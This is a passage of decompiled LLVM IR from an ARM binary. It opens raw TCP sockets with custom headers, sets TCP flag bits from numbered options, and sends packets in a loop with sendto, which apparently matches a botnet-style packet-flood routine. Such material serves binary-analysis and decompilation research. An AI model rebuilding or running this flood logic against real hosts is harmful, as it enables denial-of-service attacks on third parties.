  %v0_c648 = load i32, i32* %ip.global-to-local, align 4
  %v4_c648 = inttoptr i32 %v0_c648 to %sockaddr*
  %v7_c650 = inttoptr i32 %v0_c634 to i32*
  %v9_c650 = call i32 @sendto(i32 %v3_c00c, i32* %v7_c650, i32 %v0_c640, i32 16384, %sockaddr* %v4_c648, i32 16)
  %v3_c654 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c654, i32* %r3.global-to-local, align 4
  %v1_c658 = add i32 %v3_c654, 1
  store i32 %v1_c658, i32* %r0.global-to-local, align 4
  %v1_c65c = load i32, i32* @fp, align 4
  %v9_c65c = icmp eq i32 %v1_c658, %v1_c65c
  store i1 %v9_c65c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c658, i32* %stack_var_-40, align 4
  %v6_c664 = icmp slt i32 %v1_c658, %v1_c65c
  br i1 %v6_c664, label %dec_label_pc_c668, label %dec_label_pc_c520

dec_label_pc_c668:                                ; preds = %dec_label_pc_c57c
  store i32 %v4_be6c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000.102 to i32), i32* %r3.global-to-local, align 4
  store i32 %v3_c054, i32* %ip.global-to-local, align 4
  %v4_c674 = mul i32 %v1_c658, 4
  %v5_c674 = add i32 %v4_c674, %v4_be6c
  %v6_c674 = inttoptr i32 %v5_c674 to i32*
  %v7_c674 = load i32, i32* %v6_c674, align 4
  store i32 %v7_c674, i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i1 %v9_c554, i1* %cpsr_z.global-to-local, align 1
  %v1_c680 = add i32 %v7_c674, 20
  store i32 %v1_c680, i32* @r5, align 4
  br i1 %v9_c554, label %dec_label_pc_c688, label %dec_label_pc_c568

dec_label_pc_c688:                                ; preds = %dec_label_pc_c668, %dec_label_pc_c52c
  %v0_c688 = call i32 @function_f67c()
  %v1_c688 = trunc i32 %v0_c688 to i8
  %v4_c68c = sdiv i32 %v0_c688, 256
  store i32 %v4_c68c, i32* %r3.global-to-local, align 4
  %v3_c690 = load i32, i32* @r4, align 4
  %v4_c690 = add i32 %v3_c690, 4
  %v5_c690 = inttoptr i32 %v4_c690 to i8*
  store i8 %v1_c688, i8* %v5_c690, align 1
  store i1 %v2_c698, i1* %cpsr_z.global-to-local, align 1
  %v0_c69c = load i32, i32* %r3.global-to-local, align 4
  %v1_c69c = trunc i32 %v0_c69c to i8
  %v2_c69c = load i32, i32* @r4, align 4
  %v3_c69c = add i32 %v2_c69c, 5
  %v4_c69c = inttoptr i32 %v3_c69c to i8*
  store i8 %v1_c69c, i8* %v4_c69c, align 1
  %v0_c6a0 = load i32, i32* @r4, align 4
  %v1_c6a0 = add i32 %v0_c6a0, 40
  store i32 %v1_c6a0, i32* %r0.global-to-local, align 4
  %v0_c6a4 = load i32, i32* @sb, align 4
  store i32 %v0_c6a4, i32* @r1, align 4
  %v0_c6a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c6a8, label %dec_label_pc_c57c, label %dec_label_pc_c6ac

dec_label_pc_c6ac:                                ; preds = %dec_label_pc_c568, %dec_label_pc_c688
  %v0_c6ac = phi i32 [ %v1_c574, %dec_label_pc_c568 ], [ %v1_c6a0, %dec_label_pc_c688 ]
  %v1_c6ac = inttoptr i32 %v0_c6ac to i8*
  %v2_c6ac = call i32 @function_f7fc(i8* %v1_c6ac)
  store i32 %v2_c6ac, i32* %r0.global-to-local, align 4
  %v2_c57c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c57c

; uselistorder directives
  uselistorder i32 %v0_c6a0, { 1, 0 }
  uselistorder i32 %v7_c674, { 1, 2, 0 }
  uselistorder i32 %v1_c65c, { 1, 2, 0 }
  uselistorder i32 %v1_c658, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_c5fc, { 0, 2, 1 }
  uselistorder i32 %v0_c5e4, { 1, 0, 2 }
  uselistorder i32 %v3_c5c0, { 1, 0 }
  uselistorder i32 %v3_c5a0, { 3, 2, 0, 1 }
  uselistorder i32 %v2_c58c, { 0, 2, 1 }
  uselistorder i32 %v0_c574, { 1, 0 }
  uselistorder i32 %v0_c52c, { 1, 0 }
  uselistorder i32 %v0_c520, { 1, 0 }
  uselistorder i1 %v9_c554, { 1, 0, 2, 3 }
  uselistorder i1 %v2_c698, { 2, 1, 0 }
  uselistorder i32 %v1_c508, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c45c, { 0, 2, 1 }
  uselistorder i32 %v3_c43c, { 1, 0 }
  uselistorder i32 %v0_c410, { 1, 0, 2 }
  uselistorder i32 %v3_c404, { 1, 0 }
  uselistorder i32 %v1_c368, { 1, 0 }
  uselistorder i32 %v0_c35c, { 1, 2, 0 }
  uselistorder i32 %v3_c320, { 1, 0 }
  uselistorder i32 %v2_c30c, { 1, 0 }
  uselistorder i32 %v3_c2f0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_c2e8, { 1, 0 }
  uselistorder i32 %v3_c2c4, { 1, 0, 2 }
  uselistorder i32 %v3_c2bc, { 1, 0 }
  uselistorder i32 %v4_c2a4, { 1, 0 }
  uselistorder i32 %v0_c2a0, { 0, 2, 1 }
  uselistorder i32 %v3_c0a0, { 1, 2, 3, 0 }
  uselistorder i32 %v5_c254, { 1, 0 }
  uselistorder i1 %v9_c238, { 1, 0 }
  uselistorder i32 %v4_c24c, { 1, 0 }
  uselistorder i32 %v4_c248, { 1, 0 }
  uselistorder i32 %storemerge35, { 0, 2, 1 }
  uselistorder i32 %v8_c140, { 1, 2, 0, 3 }
  uselistorder i32 %v3_c12c, { 1, 0 }
  uselistorder i32 %v7_c0f8, { 4, 1, 3, 0, 2, 5 }
  uselistorder i32 %v1_c4c8, { 1, 0 }
  uselistorder i32 %v1_c4b0, { 1, 0 }
  uselistorder i32 %v1_c498, { 1, 0 }
  uselistorder i32 %v1_c480, { 1, 0 }
  uselistorder i32 %v1_c468, { 1, 0 }
  uselistorder i32 %v5_c250, { 1, 0 }
  uselistorder i32 %v3_c188113, { 1, 0 }
  uselistorder i1 %v2_c268, { 1, 0 }
  uselistorder i32 %v1_c264, { 1, 0 }
  uselistorder i32 %v4_c260, { 2, 0, 1 }
  uselistorder i32 %v4_c244, { 1, 0 }
  uselistorder i32 %v1_c084, { 2, 1, 0 }
  uselistorder i32 %v8_c060, { 2, 1, 0 }
  uselistorder i32 %v8_c05c, { 1, 2, 0 }
  uselistorder i32 %v3_c054, { 1, 2, 3, 0 }
  uselistorder i32 %v0_c050, { 1, 0, 3, 2 }
  uselistorder i32 %v3_c010, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v3_c00c, { 3, 4, 1, 2, 5, 6, 0, 7, 8 }
  uselistorder i32 %v1_bffc, { 1, 0 }
  uselistorder i32 %v1_bfa4, { 1, 0 }
  uselistorder i32 %v1_bf84, { 1, 0 }
  uselistorder i32 %v1_bf64, { 1, 0 }
  uselistorder i32 %v1_bf44, { 1, 0 }
  uselistorder i32 %v1_bf24, { 1, 0 }
  uselistorder i32 %v1_beec, { 1, 0 }
  uselistorder i32 %v4_be6c, { 0, 3, 4, 1, 2 }
  uselistorder i32 %v4_be5c, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32 %v1_be40, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 1, 16, 15 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 50, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 67, 51, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 31, 20, 21, 27, 22, 23, 24, 25, 26, 28, 29, 30, 50, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 46, 45, 47, 49, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 6, 5, 10, 7, 8, 11, 9, 20, 12, 13, 14, 15, 16, 17, 18, 19, 24, 21, 22, 23, 25, 27, 26, 45, 42, 28, 31, 29, 32, 33, 30, 35, 34, 36, 37, 38, 40, 39, 41, 65, 64, 43, 44, 46, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 23, 14, 15, 16, 18, 0, 19, 20, 17, 21, 22, 27, 24, 25, 26 }
  uselistorder label %dec_label_pc_c6ac, { 1, 0 }
  uselistorder label %dec_label_pc_c57c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c504, { 2, 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb93, { 1, 0 }
  uselistorder label %dec_label_pc_c298, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c1d0, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_c164, { 1, 0 }
  uselistorder label %dec_label_pc_c0b0, { 1, 0 }
}

define i32 @function_c6b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c6b8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp40 = call i8 @__decompiler_undefined_function_1()
  %tmp41 = call i8 @__decompiler_undefined_function_1()
  %tmp42 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_c6b8 = load i32, i32* @r4, align 4
  %v1_c6bc = urem i32 %arg1, 256
  store i32 %v1_c6bc, i32* @fp, align 4
  store i32 %v1_c6bc, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_c6d4 = urem i32 %arg3, 256
  store i32 %v1_c6d4, i32* @r4, align 4
  %v2_c6d8 = call i32* @calloc(i32 %v1_c6bc, i32 16)
  %v4_c6d8 = ptrtoint i32* %v2_c6d8 to i32
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_c6e4 = load i32, i32* @fp, align 4
  store i32 %v0_c6e4, i32* %r0.global-to-local, align 4
  %v2_c6e8 = call i32* @calloc(i32 %v0_c6e4, i32 4)
  %v4_c6e8 = ptrtoint i32* %v2_c6e8 to i32
  %v0_c6ec = load i32, i32* @r5, align 4
  store i32 %v0_c6ec, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c6fc = load i32, i32* @r4, align 4
  store i32 %v0_c6fc, i32* %r0.global-to-local, align 4
  %v5_c700 = inttoptr i32 %v0_c6ec to i32*
  %v6_c700 = call i32 @function_92dc(i32 %v0_c6fc, i32* %v5_c700, i32 2, i32 0)
  %v1_c70c = urem i32 %v6_c700, 256
  store i32 %v1_c70c, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c718 = load i32, i32* @r5, align 4
  store i32 %v0_c718, i32* %r1.global-to-local, align 4
  %v0_c71c = load i32, i32* @r4, align 4
  store i32 %v0_c71c, i32* %r0.global-to-local, align 4
  %v6_c724 = inttoptr i32 %v0_c718 to i32*
  %v7_c724 = call i32 @function_92dc(i32 %v0_c71c, i32* %v6_c724, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_c728 = load i32, i32* @r5, align 4
  store i32 %v0_c728, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_c724, i32* @r6, align 4
  %v0_c738 = load i32, i32* @r4, align 4
  store i32 %v0_c738, i32* %r0.global-to-local, align 4
  %v4_c73c = inttoptr i32 %v0_c728 to i32*
  %v5_c73c = call i32 @function_92dc(i32 %v0_c738, i32* %v4_c73c, i32 4, i32 64)
  %v1_c744 = urem i32 %v5_c73c, 256
  store i32 %v1_c744, i32* %ip.global-to-local, align 4
  %v0_c748 = load i32, i32* @r5, align 4
  store i32 %v0_c748, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c754 = load i32, i32* @r4, align 4
  store i32 %v0_c754, i32* %r0.global-to-local, align 4
  %v6_c75c = inttoptr i32 %v0_c748 to i32*
  %v7_c75c = call i32 @function_92dc(i32 %v0_c754, i32* %v6_c75c, i32 5, i32 1)
  %v1_c768 = urem i32 %v7_c75c, 256
  store i32 %v1_c768, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  %v0_c770 = load i32, i32* @r5, align 4
  store i32 %v0_c770, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c778 = load i32, i32* @r4, align 4
  store i32 %v0_c778, i32* %r0.global-to-local, align 4
  %v5_c780 = inttoptr i32 %v0_c770 to i32*
  %v6_c780 = call i32 @function_92dc(i32 %v0_c778, i32* %v5_c780, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_c784 = load i32, i32* @r5, align 4
  store i32 %v0_c784, i32* %r1.global-to-local, align 4
  %v3_c788 = mul i32 %v6_c780, 65536
  store i32 %v3_c788, i32* @r7, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c794 = load i32, i32* @r4, align 4
  store i32 %v0_c794, i32* %r0.global-to-local, align 4
  %v4_c798 = inttoptr i32 %v0_c784 to i32*
  %v5_c798 = call i32 @function_92dc(i32 %v0_c794, i32* %v4_c798, i32 11, i32 0)
  %v1_c7a0 = urem i32 %v5_c798, 256
  store i32 %v1_c7a0, i32* %ip.global-to-local, align 4
  %v0_c7a4 = load i32, i32* @r5, align 4
  store i32 %v0_c7a4, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c7b0 = load i32, i32* @r4, align 4
  store i32 %v0_c7b0, i32* %r0.global-to-local, align 4
  %v5_c7b8 = inttoptr i32 %v0_c7a4 to i32*
  %v6_c7b8 = call i32 @function_92dc(i32 %v0_c7b0, i32* %v5_c7b8, i32 12, i32 1)
  %v1_c7c0 = urem i32 %v6_c7b8, 256
  store i32 %v1_c7c0, i32* %ip.global-to-local, align 4
  %v0_c7c4 = load i32, i32* @r5, align 4
  store i32 %v0_c7c4, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c7d0 = load i32, i32* @r4, align 4
  store i32 %v0_c7d0, i32* %r0.global-to-local, align 4
  %v5_c7d8 = inttoptr i32 %v0_c7c4 to i32*
  %v6_c7d8 = call i32 @function_92dc(i32 %v0_c7d0, i32* %v5_c7d8, i32 13, i32 1)
  %v1_c7e0 = urem i32 %v6_c7d8, 256
  store i32 %v1_c7e0, i32* %ip.global-to-local, align 4
  %v0_c7e4 = load i32, i32* @r5, align 4
  store i32 %v0_c7e4, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c7f0 = load i32, i32* @r4, align 4
  store i32 %v0_c7f0, i32* %r0.global-to-local, align 4
  %v5_c7f8 = inttoptr i32 %v0_c7e4 to i32*
  %v6_c7f8 = call i32 @function_92dc(i32 %v0_c7f0, i32* %v5_c7f8, i32 14, i32 0)
  %v1_c800 = urem i32 %v6_c7f8, 256
  store i32 %v1_c800, i32* %ip.global-to-local, align 4
  %v0_c804 = load i32, i32* @r5, align 4
  store i32 %v0_c804, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c810 = load i32, i32* @r4, align 4
  store i32 %v0_c810, i32* %r0.global-to-local, align 4
  %v5_c818 = inttoptr i32 %v0_c804 to i32*
  %v6_c818 = call i32 @function_92dc(i32 %v0_c810, i32* %v5_c818, i32 15, i32 0)
  %v1_c820 = urem i32 %v6_c818, 256
  store i32 %v1_c820, i32* %ip.global-to-local, align 4
  %v0_c824 = load i32, i32* @r5, align 4
  store i32 %v0_c824, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c830 = load i32, i32* @r4, align 4
  store i32 %v0_c830, i32* %r0.global-to-local, align 4
  %v5_c838 = inttoptr i32 %v0_c824 to i32*
  %v6_c838 = call i32 @function_92dc(i32 %v0_c830, i32* %v5_c838, i32 16, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v6_c838, i32* %ip.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_c848 = load i32, i32* @r5, align 4
  store i32 %v0_c848, i32* %r1.global-to-local, align 4
  %v0_c84c = load i32, i32* @r4, align 4
  store i32 %v0_c84c, i32* %r0.global-to-local, align 4
  %v1_c850 = urem i32 %v6_c838, 256
  store i32 %v1_c850, i32* @r8, align 4
  %v4_c854 = inttoptr i32 %v0_c848 to i32*
  %v5_c854 = call i32 @function_92dc(i32 %v0_c84c, i32* %v4_c854, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c860 = load i32, i32* @r5, align 4
  store i32 %v0_c860, i32* %r1.global-to-local, align 4
  store i32 %v5_c854, i32* @sb, align 4
  %v0_c868 = load i32, i32* @r4, align 4
  store i32 %v0_c868, i32* %r0.global-to-local, align 4
  %v4_c86c = inttoptr i32 %v0_c860 to i32*
  %v5_c86c = call i32 @function_92dc(i32 %v0_c868, i32* %v4_c86c, i32 1, i32 1)
  store i32 3, i32* %r1.global-to-local, align 4
  %v1_c878 = urem i32 %v5_c86c, 256
  store i32 %v1_c878, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_c888 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_c888, i32* %r0.global-to-local, align 4
  %v0_c88c = load i32, i32* @r7, align 4
  %v3_c88c = udiv i32 %v0_c88c, 65536
  store i32 %v3_c88c, i32* %r1.global-to-local, align 4
  %v2_c890 = icmp eq i32 %v3_c888, -1
  store i1 %v2_c890, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c890, label %dec_label_pc_cb14, label %dec_label_pc_c8a0

dec_label_pc_c8a0:                                ; preds = %dec_label_pc_c6b8
  store i32 1, i32* %stack_var_-40, align 4
  %v6_c8a8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_c8a8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_c8bc = call i32 @setsockopt(i32 %v3_c888, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_c8bc, i32* %r0.global-to-local, align 4
  %v2_c8c0 = icmp eq i32 %v7_c8bc, -1
  store i1 %v2_c8c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c8c0, label %dec_label_pc_cb0c, label %dec_label_pc_c8c8

dec_label_pc_c8c8:                                ; preds = %dec_label_pc_c8a0
  %v0_c8c8 = load i32, i32* @fp, align 4
  %v2_c8c8 = icmp eq i32 %v0_c8c8, 0
  store i1 %v2_c8c8, i1* %cpsr_z.global-to-local, align 1
  %v0_c8cc = load i32, i32* @r6, align 4
  %v3_c8cc = mul i32 %v0_c8cc, 65536
  store i32 %v3_c8cc, i32* %r0.global-to-local, align 4
  %v3_c8d0 = urem i32 %v0_c8cc, 65536
  store i32 %v3_c8d0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp85 = icmp slt i32 %v0_c8c8, 1
  br i1 %tmp85, label %.thread27, label %dec_label_pc_c8f4.preheader

.thread27:                                        ; preds = %dec_label_pc_c8c8
  store i32 0, i32* %stack_var_-40, align 4
  br label %dec_label_pc_cd94

dec_label_pc_c8f4.preheader:                      ; preds = %dec_label_pc_c8c8
  %v5_c8d8 = load i32, i32* @r7, align 4
  %v8_c8d8 = udiv i32 %v5_c8d8, 16777216
  %tmp86 = udiv i32 %v0_c8cc, 256
  %v8_c8dc = urem i32 %tmp86, 256
  store i32 %v8_c8dc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_c900 = urem i32 %v0_c8cc, 256
  %v9_c9ec = icmp eq i32 %v3_c88c, add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1)
  %v2_ca10 = ptrtoint i32* %stack_var_-60 to i32
  %tmp87 = bitcast i32* %stack_var_-60 to %sockaddr*
  %v4_ca2c = mul nuw nsw i32 %v1_c900, 256
  %v5_ca2c = or i32 %v8_c8dc, %v4_ca2c
  %sext11 = mul i32 %tmp86, 16777216
  %v4_ca38 = sdiv i32 %sext11, 16777216
  %v3_ca40 = ashr i32 %sext11, 31
  %tmp88 = bitcast i32* %stack_var_-76 to %sockaddr*
  %v2_ca70 = ptrtoint i32* %stack_var_-332 to i32
  %v2_ca74 = ptrtoint i32* %stack_var_-44 to i32
  %v4_cabc = zext i8 %tmp41 to i32
  %v4_cac0 = zext i8 %tmp40 to i32
  %v4_cacc = mul nuw nsw i32 %v4_cac0, 256
  %v4_cadc = zext i8 %tmp to i32
  %v1_cae0 = and i32 %v4_cadc, 18
  %v2_cae4 = icmp eq i32 %v1_cae0, 18
  %v1_c9fc = mul nuw nsw i32 %v3_c88c, 256
  %v4_ca00 = and i32 %v1_c9fc, 65280
  %v5_ca00 = or i32 %v8_c8d8, %v4_ca00
  %v3_ca04113 = udiv i32 %v4_ca00, 256
  %v1_ca08 = trunc i32 %v3_ca04113 to i8
  %sext = mul i32 %v6_c700, 16777216
  %v4_cc08 = sdiv i32 %sext, 16777216
  %sext9 = mul i32 %v5_c73c, 16777216
  %v4_cc1c = sdiv i32 %sext9, 16777216
  %v5_cacc = or i32 %v4_cabc, %v4_cacc
  %v1_caec = and i32 %v4_cadc, 5
  %v2_caec = icmp eq i32 %v1_caec, 0
  %v1_ca0c = trunc i32 %v8_c8d8 to i8
  %v1_cc18 = trunc i32 %v4_cc08 to i8
  %v1_cce4 = urem i32 %v5_c798, 2
  %tmp114 = sub nsw i32 0, %v1_cce4
  %v4_ccec = and i32 %tmp114, 32
  %v1_ccfc = urem i32 %v6_c7b8, 2
  %tmp115 = sub nsw i32 0, %v1_ccfc
  %v4_cd04 = and i32 %tmp115, 16
  %v1_cd14 = urem i32 %v6_c7d8, 2
  %tmp116 = sub nsw i32 0, %v1_cd14
  %v4_cd1c = and i32 %tmp116, 8
  %v1_cd2c = urem i32 %v6_c7f8, 2
  %tmp117 = sub nsw i32 0, %v1_cd2c
  %v4_cd34 = and i32 %tmp117, 4
  %v1_cd44 = urem i32 %v6_c818, 2
  %tmp118 = sub nsw i32 0, %v1_cd44
  %v3_cd4c = and i32 %tmp118, 2
  br label %dec_label_pc_c8f4

dec_label_pc_c8f4:                                ; preds = %dec_label_pc_cd80, %dec_label_pc_caf4, %dec_label_pc_c8f4.preheader
  store i32 %v8_c8dc, i32* %r3.global-to-local, align 4
  store i32 %v1_c900, i32* %ip.global-to-local, align 4
  %v0_c90c = load i32, i32* @sb, align 4
  %v1_c90c = add i32 %v0_c90c, 40
  store i32 %v1_c90c, i32* @sl, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c91c107 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_c91c107, i32* %r0.global-to-local, align 4
  %v2_c920108 = icmp eq i32 %v3_c91c107, -1
  store i1 %v2_c920108, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c91c107, i32* @r7, align 4
  br i1 %v2_c920108, label %dec_label_pc_cd80, label %dec_label_pc_c92c

dec_label_pc_c92c:                                ; preds = %dec_label_pc_c8f4, %dec_label_pc_cb00
  %v3_c91c109 = phi i32 [ %v3_c91c, %dec_label_pc_cb00 ], [ %v3_c91c107, %dec_label_pc_c8f4 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c934 = call i32 (i32, i32, ...) @fcntl(i32 %v3_c91c109, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_c93c = or i32 %v2_c934, 2048
  store i32 %v1_c93c, i32* %r2.global-to-local, align 4
  %v0_c940 = load i32, i32* @r7, align 4
  store i32 %v0_c940, i32* %r0.global-to-local, align 4
  %v2_c944 = call i32 (i32, i32, ...) @fcntl(i32 %v0_c940, i32 4)
  %v3_c948 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c948, i32* %ip.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v5_c964 = mul i32 %v3_c948, 24
  store i32 %v5_c964, i32* %r1.global-to-local, align 4
  %v2_c968 = add i32 %v5_c964, %arg2
  store i32 %v2_c968, i32* %r2.global-to-local, align 4
  %v1_c96c = add i32 %v2_c968, 20
  %v2_c96c = inttoptr i32 %v1_c96c to i8*
  %v3_c96c = load i8, i8* %v2_c96c, align 1
  %v4_c96c = zext i8 %v3_c96c to i32
  store i32 %v4_c96c, i32* %r3.global-to-local, align 4
  %v2_c970 = icmp ugt i8 %v3_c96c, 30
  %v7_c970 = icmp eq i8 %v3_c96c, 31
  store i1 %v7_c970, i1* %cpsr_z.global-to-local, align 1
  %v2_c974 = xor i1 %v7_c970, true
  %v3_c974 = and i1 %v2_c970, %v2_c974
  %v5_c974 = add i32 %v2_c968, 16
  %v6_c974 = inttoptr i32 %v5_c974 to i32*
  %v7_c974 = load i32, i32* %v6_c974, align 4
  br i1 %v3_c974, label %dec_label_pc_c9e0, label %dec_label_pc_c980

dec_label_pc_c980:                                ; preds = %dec_label_pc_c92c
  store i32 %v7_c974, i32* %r4.global-to-local, align 4
  %v0_c984 = call i32 @function_f67c()
  store i32 %v0_c984, i32* %r0.global-to-local, align 4
  %v3_c988 = load i32, i32* %stack_var_-40, align 4
  %v5_c990 = mul i32 %v3_c988, 24
  %v2_c99c = add i32 %v5_c990, %arg2
  store i32 %v2_c99c, i32* %r1.global-to-local, align 4
  %v1_c998 = udiv i32 %v7_c974, 256
  %v3_c9a0 = and i32 %v1_c998, 65280
  store i32 %v3_c9a0, i32* %r2.global-to-local, align 4
  %v1_c9a4 = and i32 %v7_c974, 65280
  store i32 %v1_c9a4, i32* %r3.global-to-local, align 4
  %v3_c9a8 = mul i32 %v7_c974, 16777216
  store i32 %v3_c9a8, i32* %ip.global-to-local, align 4
  %v1_c9ac = add i32 %v2_c99c, 20
  %v2_c9ac = inttoptr i32 %v1_c9ac to i8*
  %v3_c9ac = load i8, i8* %v2_c9ac, align 1
  %v4_c9ac = zext i8 %v3_c9ac to i32
  store i32 %v4_c9ac, i32* %lr.global-to-local, align 4
  %v4_c9b0 = mul nuw nsw i32 %v1_c9a4, 256
  %v5_c9b0 = or i32 %v4_c9b0, %v3_c9a8
  store i32 %v5_c9b0, i32* %ip.global-to-local, align 4
  %v2_c9b8 = call i32 @llvm.bswap.i32(i32 %v7_c974)
  %v7_c9bc = lshr i32 %v0_c984, %v4_c9ac
  %v8_c9bc = add i32 %v7_c9bc, %v2_c9b8
  store i32 %v8_c9bc, i32* %r2.global-to-local, align 4
  %v3_c9c8 = mul i32 %v8_c9bc, 16777216
  %v1_c9cc = and i32 %v8_c9bc, 65280
  store i32 %v1_c9cc, i32* %r0.global-to-local, align 4
  %v4_c9d0 = mul nuw nsw i32 %v1_c9cc, 256
